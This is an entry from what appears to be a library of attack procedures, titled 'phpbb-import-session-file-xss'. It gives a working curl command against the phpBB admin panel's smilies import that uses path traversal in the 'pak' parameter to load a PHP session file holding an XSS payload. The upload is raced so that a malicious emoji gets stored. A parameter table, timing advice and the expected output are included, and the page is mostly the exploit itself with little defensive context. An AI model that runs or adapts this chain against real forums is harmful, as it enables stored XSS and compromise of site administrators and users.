---
data: >-
  curl -X POST
  "http://127.0.0.1:8082/adm/index.php?i=acp_icons&mode=smilies&current=delete"
  -H "Host: 127.0.0.1:8082" -H "Content-Type: application/x-www-form-urlencoded"
  -H "Content-Length: 156" --data
  "action=import&pak=../../../../../../../../../var/lib/php/sessions/sess_shin24&form_token=68340f4826dcfa788b02f1d01ad3b74b06b64bde&creation_time=1695113245"
tags:
  - xss
  - path-traversal
type: command
output: 'Imports malicious emoji if raced successfully, passing format regex'
executor: bash
platforms:
  - Linux
  - Web
id: 71825159-fd87-4711-a44d-9176c66975e2
created_at: '2025-12-14T17:26:49.090Z'
updated_at: '2025-12-14T17:26:49.090Z'
verified: false
validated: true
submitted: true
---
# phpbb-import-session-file-xss

## Command

```bash
curl -X POST "http://127.0.0.1:8082/adm/index.php?i=acp_icons&mode=smilies&current=delete" -H "Host: 127.0.0.1:8082" -H "Content-Type: application/x-www-form-urlencoded" -H "Content-Length: 156" --data "action=import&pak=../../../../../../../../../var/lib/php/sessions/sess_shin24&form_token=68340f4826dcfa788b02f1d01ad3b74b06b64bde&creation_time=1695113245"
```

## Description

Imports from a traversed path to a session file containing XSS payload, racing the upload to capture before cleanup, chaining path traversal to Stored XSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| pak | Traversal to session file, e.g., ../../../../../../../../../var/lib/php/sessions/sess_shin24 | Yes |
| action | 'import' mode | Yes |
| form_token | CSRF token | Yes |
| creation_time | Timestamp | Yes |

## Examples

### Basic Usage

```bash
curl ... # as above
```

### Advanced Usage

Time execution right after upload command.

## Expected Output

Success response if payload imported; emoji added with XSS.

## Related

- [[procedures/Exploit-PHP-Session-Upload-Progress-for-XSS-Race]]
